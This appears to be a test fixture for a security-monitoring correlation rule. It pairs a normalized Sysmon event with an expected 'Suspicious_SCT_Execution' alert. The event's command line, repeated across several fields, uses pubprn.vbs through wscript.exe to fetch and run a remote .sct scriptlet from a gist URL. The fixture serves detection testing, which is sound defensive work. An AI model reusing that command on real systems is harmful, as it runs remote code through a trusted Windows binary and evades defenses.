{"action": "start", "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-Sysmon\",\"Guid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"},\"EventID\":\"1\",\"Version\":\"5\",\"Level\":\"4\",\"Task\":\"1\",\"Opcode\":\"0\",\"Keywords\":\"0x8000000000000000\",\"TimeCreated\":{\"SystemTime\":\"2023-06-29T03:35:28.294237700Z\"},\"EventRecordID\":\"976125\",\"Correlation\":null,\"Execution\":{\"ProcessID\":\"2304\",\"ThreadID\":\"3460\"},\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"pc.domain.com\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"text\":\"-\",\"Name\":\"RuleName\"},{\"text\":\"2023-06-29 03:35:28.292\",\"Name\":\"UtcTime\"},{\"text\":\"{20fff121-fc00-649c-de1c-000000003c00}\",\"Name\":\"ProcessGuid\"},{\"text\":\"3920\",\"Name\":\"ProcessId\"},{\"text\":\"C:\\\\Windows\\\\System32\\\\wscript.exe\",\"Name\":\"Image\"},{\"text\":\"5.812.10240.16384\",\"Name\":\"FileVersion\"},{\"text\":\"Microsoft ® Windows Based Script Host\",\"Name\":\"Description\"},{\"text\":\"Microsoft ® Windows Script Host\",\"Name\":\"Product\"},{\"text\":\"Microsoft Corporation\",\"Name\":\"Company\"},{\"text\":\"wscript.exe\",\"Name\":\"OriginalFileName\"},{\"text\":\"\\\"C:\\\\Windows\\\\System32\\\\WScript.exe\\\" \\\"C:\\\\Windows\\\\System32\\\\Printing_Admin_Scripts\\\\en-US\\\\pubprn.vbs\\\"  127.0.0.1 script:https://gist.githubusercontent.com/bohops/72031fecb0f58531753f51d4ef2b86e9/raw/805dcca541e6b5efa1420e8758eaea9c3487dcf0/notepad.sct\",\"Name\":\"CommandLine\"},{\"text\":\"C:\\\\Windows\\\\System32\\\\Printing_Admin_Scripts\\\\en-US\\\\\",\"Name\":\"CurrentDirectory\"},{\"text\":\"domain\\\\Administrator\",\"Name\":\"User\"},{\"text\":\"{20fff121-bd15-6493-e256-310a00000000}\",\"Name\":\"LogonGuid\"},{\"text\":\"0xa3156e2\",\"Name\":\"LogonId\"},{\"text\":\"1\",\"Name\":\"TerminalSessionId\"},{\"text\":\"High\",\"Name\":\"IntegrityLevel\"},{\"text\":\"MD5=F5E5DF6C9D62F4E940B334954A2046FC,SHA256=47CACD60D91441137D055184614B1A418C0457992977857A76CA05C75BBC1B56,IMPHASH=0F71D5F6F4CBB935CE1B09754102419C\",\"Name\":\"Hashes\"},{\"text\":\"{20fff121-5963-649a-1818-000000003c00}\",\"Name\":\"ParentProcessGuid\"},{\"text\":\"748\",\"Name\":\"ParentProcessId\"},{\"text\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"Name\":\"ParentImage\"},{\"text\":\"\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" \",\"Name\":\"ParentCommandLine\"},{\"text\":\"domain\\\\Administrator\",\"Name\":\"ParentUser\"}]}}}", "category.generic": "Process", "category.high": "Availability Management", "category.low": "Control", "datafield1": "171005666", "datafield10": "wscript.exe", "datafield11": "c:\\", "datafield2": "748", "datafield3": "c:\\windows\\system32\\", "datafield4": "cmd.exe", "datafield5": "\"C:\\Windows\\System32\\WScript.exe\" \"C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs\"  127.0.0.1 script:https://gist.githubusercontent.com/bohops/72031fecb0f58531753f51d4ef2b86e9/raw/805dcca541e6b5efa1420e8758eaea9c3487dcf0/notepad.sct", "datafield6": "20fff121-bd15-6493-e256-310a00000000", "datafield7": "171005666", "datafield8": "20fff121-fc00-649c-de1c-000000003c00", "datafield9": "\"C:\\Windows\\system32\\cmd.exe\"", "event_src.category": "Other", "event_src.fqdn": "pc.domain.com", "event_src.host": "pc.domain.com", "event_src.hostname": "pc", "event_src.subsys": "Microsoft-Windows-Sysmon/Operational", "event_src.title": "sysmon", "event_src.vendor": "microsoft", "generator.type": "logcollector", "generator.version": "N26.0.2936", "id": "PT_Microsoft_Windows_eventlog_Sysmon_1_Process_creation", "importance": "info", "input_id": "00000000-0000-0000-0000-000000000000", "mime": "application/x-pt-eventlog", "msgid": "1", "normalized": true, "object": "process", "object.account.domain": "domain", "object.account.id": "synthetic:administrator@domain", "object.account.name": "administrator", "object.account.privileges": "High", "object.account.session_id": "171005666", "object.hash": "47CACD60D91441137D055184614B1A418C0457992977857A76CA05C75BBC1B56", "object.id": "3920", "object.name": "wscript.exe", "object.path": "c:\\windows\\system32\\", "object.process.cmdline": "\"C:\\Windows\\System32\\WScript.exe\" \"C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs\"  127.0.0.1 script:https://gist.githubusercontent.com/bohops/72031fecb0f58531753f51d4ef2b86e9/raw/805dcca541e6b5efa1420e8758eaea9c3487dcf0/notepad.sct", "object.process.cwd": "C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\", "object.process.fullpath": "c:\\windows\\system32\\wscript.exe", "object.process.guid": "20fff121-fc00-649c-de1c-000000003c00", "object.process.hash.imphash": "0F71D5F6F4CBB935CE1B09754102419C", "object.process.hash.md5": "F5E5DF6C9D62F4E940B334954A2046FC", "object.process.hash.sha256": "47CACD60D91441137D055184614B1A418C0457992977857A76CA05C75BBC1B56", "object.process.id": "3920", "object.process.meta": "Description:Microsoft ® Windows Based Script Host | Product:Microsoft ® Windows Script Host | Company:Microsoft Corporation", "object.process.name": "wscript.exe", "object.process.original_name": "wscript.exe", "object.process.parent.cmdline": "\"C:\\Windows\\system32\\cmd.exe\"", "object.process.parent.fullpath": "c:\\windows\\system32\\cmd.exe", "object.process.parent.guid": "20fff121-5963-649a-1818-000000003c00", "object.process.parent.id": "748", "object.process.parent.name": "cmd.exe", "object.process.parent.path": "c:\\windows\\system32\\", "object.process.path": "c:\\windows\\system32\\", "object.process.version": "5.812.10240.16384", "object.property": "metadata", "object.value": "Description:Microsoft ® Windows Based Script Host | Product:Microsoft ® Windows Script Host | Company:Microsoft Corporation", "object.version": "5.812.10240.16384", "recv_ipv4": "127.0.0.1", "recv_time": "2023-06-29T04:15:56.110Z", "status": "success", "subject": "account", "subject.account.domain": "domain", "subject.account.id": "synthetic:administrator@domain", "subject.account.name": "administrator", "subject.account.privileges": "High", "subject.account.session_id": "171005666", "subject.domain": "domain", "subject.name": "administrator", "subject.state": "on behalf of oneself", "tag": "some_tag", "task_id": "00000000-0000-0000-0000-000000000000", "taxonomy_version": "26.0.215-release-26.0", "time": "2023-06-29T03:35:28.292Z", "type": "raw", "uuid": "d4cabe18-9161-48c8-b250-47c53380944f"}

expect 1 {"correlation_name": "Suspicious_SCT_Execution"}
